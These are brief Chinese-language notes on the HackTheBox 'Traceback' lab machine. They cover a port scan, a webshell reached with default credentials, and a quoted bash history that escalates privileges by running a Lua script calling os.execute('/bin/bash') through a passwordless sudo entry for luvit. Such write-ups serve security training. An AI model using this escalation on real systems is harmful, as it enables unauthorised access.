# HackTheBox-Traceback Notes

## 信息搜集

### SYN端口扫描结果

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Webshell

通过提示信息找到了webshell地址，用户名/密码admin

通过Socat升级到完全交互式shell

.bash_history

```bash
ls -la
sudo -l # 发现 /home/sysadmin/luvit 不需要密码就可以sudo执行
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua #os.execute("/bin/bash") 直接提权
rm privesc.lua
logout
exit
ls
cd ~
ls
exit
```

note.txt

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

root提权以后再研究